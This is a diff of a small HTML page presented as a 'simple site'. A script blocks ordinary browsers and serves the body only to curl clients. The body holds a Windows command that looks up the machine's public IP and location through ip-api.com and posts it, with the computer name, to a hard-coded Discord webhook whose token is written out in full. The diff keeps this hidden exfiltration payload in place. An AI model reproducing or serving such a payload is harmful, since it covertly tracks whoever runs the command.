@@ -1,10 +1,18 @@
+<!DOCTYPE html>
+<html lang="ru">
 <head>
-      <script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Простой сайт</title>
+    <script>
         if (!navigator.userAgent.includes("curl")) {
             document.body.innerHTML = "Доступ запрещен!";
+        } else {
+            document.body.innerHTML = "1";
         }
     </script>
 </head>
 <body>
-for /f "delims=" %i in ('curl -s ip-api.com/json') do @curl -H "Content-Type: application/json" -d "{\"username\": \"%computername%\", \"content\": \""%i"\"}" https://discord.com/api/webhooks/1228625584477704212/vBZFkPvEbabtdnPHV_mz9mcNShxW-cCjbV5kn37LtkXTj6zv_bCBRtYWvkeYQegSnPU1
+      for /f "delims=" %i in ('curl -s ip-api.com/json') do @curl -H "Content-Type: application/json" -d "{\"username\": \"%computername%\", \"content\": \""%i"\"}" https://discord.com/api/webhooks/1228625584477704212/vBZFkPvEbabtdnPHV_mz9mcNShxW-cCjbV5kn37LtkXTj6zv_bCBRtYWvkeYQegSnPU1
 </body>
+</html>
